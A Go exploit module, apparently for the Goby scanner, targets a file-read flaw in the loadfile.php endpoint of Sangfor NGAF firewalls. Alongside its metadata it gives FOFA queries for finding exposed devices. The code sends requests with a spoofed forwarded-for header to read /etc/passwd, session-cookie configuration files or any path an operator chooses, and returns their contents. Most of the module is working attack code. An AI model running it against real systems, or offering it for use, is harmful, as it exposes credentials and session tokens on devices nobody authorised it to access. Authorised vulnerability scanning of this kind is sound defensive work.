package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Sangfor Next Generation Firewall loadfile.php file reading vulnerability",
    "Description": "<p>Sangfor next-generation firewall is a next-generation application firewall designed with application security requirements in mind.</p><p>Sangfor next-generation firewall has a file reading vulnerability in loadfile.php. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Product": "SANGFOR-NGAF",
    "Homepage": "https://www.sangfor.com.cn/",
    "DisclosureDate": "2023-10-05",
    "PostTime": "2023-10-07",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "title=\"SANGFOR | NGAF\" || banner=\"Redirect.php?url=LogInOut.php\" || header=\"Redirect.php?url=LogInOut.php\" || cert=\"SANGFORNGAF\" || cert=\"SANGFOR NGAF\" || body=\"SANGFOR FW\" || title=\"SANGFOR | AF \" || title=\"SANGFOR AF\" || body=\"if (!this.SF)\" || ((body=\"SF.cookie('sangfor_session_id\" || (body=\"version = _(\\\"异步获取提交成功，但是获取版本信息失败\\\");\" && body=\"this.sf = {};\")) && body!=\"<div class=\\\"title title-login\\\">登录防火墙WEB防篡改管理系统</div>\") || (body=\"return decodeURIComponent(arr.join(''))\" && body=\"name=\\\"robots\\\" content=\\\"nofollow\\\"\" && cert!=\"Organization: WEBUI\") || (title==\"欢迎登录\" && body=\"<img src=\\\"Captcha.php?r=123123\\\" alt=\\\"verify_code\\\" id=\\\"verify_code\\\">\" && body=\"<input type=\\\"hidden\\\" id=\\\"rsa_key\\\" value\")",
    "GobyQuery": "title=\"SANGFOR | NGAF\" || banner=\"Redirect.php?url=LogInOut.php\" || header=\"Redirect.php?url=LogInOut.php\" || cert=\"SANGFORNGAF\" || cert=\"SANGFOR NGAF\" || body=\"SANGFOR FW\" || title=\"SANGFOR | AF \" || title=\"SANGFOR AF\" || body=\"if (!this.SF)\" || ((body=\"SF.cookie('sangfor_session_id\" || (body=\"version = _(\\\"异步获取提交成功，但是获取版本信息失败\\\");\" && body=\"this.sf = {};\")) && body!=\"<div class=\\\"title title-login\\\">登录防火墙WEB防篡改管理系统</div>\") || (body=\"return decodeURIComponent(arr.join(''))\" && body=\"name=\\\"robots\\\" content=\\\"nofollow\\\"\" && cert!=\"Organization: WEBUI\") || (title==\"欢迎登录\" && body=\"<img src=\\\"Captcha.php?r=123123\\\" alt=\\\"verify_code\\\" id=\\\"verify_code\\\">\" && body=\"<input type=\\\"hidden\\\" id=\\\"rsa_key\\\" value\")",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Recommendation": "<p>The solution has been released so far, please pay attention to the manufacturer's homepage for updates: <a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a></p>",
    "References": [
        "https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "DcUserCookie,custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/./passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "深信服下一代防火墙 loadfile.php 文件读取漏洞",
            "Product": "SANGFOR-NGAF",
            "Description": "<p>深信服下一代防火墙是一款以应用安全需求出发而设计的下一代应用防火墙。</p><p>深信服下一代防火墙在 loadfile.php 处存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>目前已发布解决方案，请关注厂商主页更新：<a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Sangfor Next Generation Firewall loadfile.php file reading vulnerability",
            "Product": "SANGFOR-NGAF",
            "Description": "<p>Sangfor next-generation firewall is a next-generation application firewall designed with application security requirements in mind.</p><p>Sangfor next-generation firewall has a file reading vulnerability in loadfile.php. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
            "Recommendation": "<p>The solution has been released so far, please pay attention to the manufacturer's homepage for updates: <a href=\"https://www.sangfor.com.cn/\" target=\"_blank\">https://www.sangfor.com.cn/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10841"
}`
	sendPayloadGo70pRYF := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewGetRequestConfig("/svpn_html/loadfile.php?file=" + url.QueryEscape(filePath))
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("y-forwarded-for", "127.0.0.1")
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadGo70pRYF(hostInfo, "/etc/./passwd")
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root:")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "DcUserCookie" {
				for _, pathDcUserCookie := range []string{"/etc/sinfor/DcUserCookie.conf", "/etc/en/sinfor/DcUserCookie.conf", "/config/etc/sinfor/DcUserCookie.conf", "/config/etc/en/sinfor/DcUserCookie.conf"} {
					resp, err := sendPayloadGo70pRYF(expResult.HostInfo, pathDcUserCookie)
					if err != nil {
						expResult.Output = "漏洞利用失败"
						return expResult
					} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "session_id") {
						expResult.Success = true
						expResult.Output = resp.RawBody
						return expResult
					} else {
						expResult.Output = "漏洞利用失败"
					}
				}
			} else if attackType == "custom" {
				filePath := goutils.B2S(stepLogs.Params["filePath"])
				resp, err := sendPayloadGo70pRYF(expResult.HostInfo, filePath)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if resp != nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.RawBody
					return expResult
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
